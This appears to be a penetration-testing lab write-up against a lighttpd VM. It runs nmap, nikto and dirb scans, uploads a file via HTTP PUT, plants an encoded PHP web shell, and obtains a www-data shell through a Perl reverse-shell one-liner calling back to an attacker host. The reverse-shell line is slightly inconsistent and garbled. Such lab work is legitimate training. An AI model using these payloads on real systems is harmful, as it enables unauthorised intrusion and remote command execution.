#Port Scan

Perform a Ping Sweep

nmap -sn 192.168.114.1-254

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-01 23:57 AEDT
MAC Address: 00:50:56:FE:6D:CA (VMware)
Nmap scan report for 192.168.114.132
Host is up (-0.10s latency).
MAC Address: 00:50:56:FF:87:FA (VMware)
Nmap scan report for 192.168.114.131
Host is up.
Nmap done: 254 IP addresses (5 hosts up) scanned in 2.35 seconds

192.168.114.131 is my KALI machine
192.168.114.132 is target machine

#Enumeration
###Port Enumeration

nmap -sV 192.168.114.132

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28

### HTTP Enumeration

nikto -h 192.168.114.132

+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ OSVDB-3268: /test/: Directory indexing found.
+ 26188 requests: 0 error(s) and 4 item(s) reported on remote host

Directory indexing found , but it is empty, so useless information.

dirb http://192.168.114.132

---- Scanning URL: http://192.168.114.132/ ----
+ http://192.168.114.132/index.php (CODE:200|SIZE:163)                         
==> DIRECTORY: http://192.168.114.132/test/ 

Also only found one directory.

### Searching for exploits

searchsploit -e lighttpd

Does not return with any major exploits or vulnerabilities.

Low Hanging Fruit : http://192.168.114.132/test/ 

Using cURL to see If we can upload any files onto /test/

echo "test" > test.txt
curl -T 'test.txt' 'http://192.168.114.132/test/test.txt'

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>417 - Expectation Failed</title>
 </head>
 <body>
  <h1>417 - Expectation Failed</h1>
 </body>
</html>

We are returned with Expectation Failed, which is unique. A bit of googling
https://stackoverflow.com/questions/9120760/curl-simple-file-upload-417-expectation-failed

Says we need to include --http1.0
curl -T 'test.txt' 'http://192.168.114.132/test/test.txt' --http1.0

Successfully Uploaded a file. 


### Exploit
Now we have full reigns on upload , you can upload a reverse php shell, backdoor etc. In this case we'll upload a basic php system call.

echo 'system($_GET['cmd']);' | base64      // Not neccessary to encode it to base64
echo "<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOwo=')) ?>" > evil.php
Upload and Accessing the exploit: in URL
http://192.168.114.132/test/evil.php?cmd="XXXXANYCOMMANDHERE"

Using a basic perl reverse shell (Generated from msfvenom)  // port 1234 , will not return anything. Port 443 works!
http://192.168.114.132/test/evil.php?cmd=192.168.114.132/test/test.php?cmd=/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

OR just use one of http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

nc -lvp 443
listening on [any] 443 ...
192.168.114.132: inverse host lookup failed: Unknown host
connect to [192.168.114.131] from (UNKNOWN) [192.168.114.132] 59858
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


#Privilege Escalation










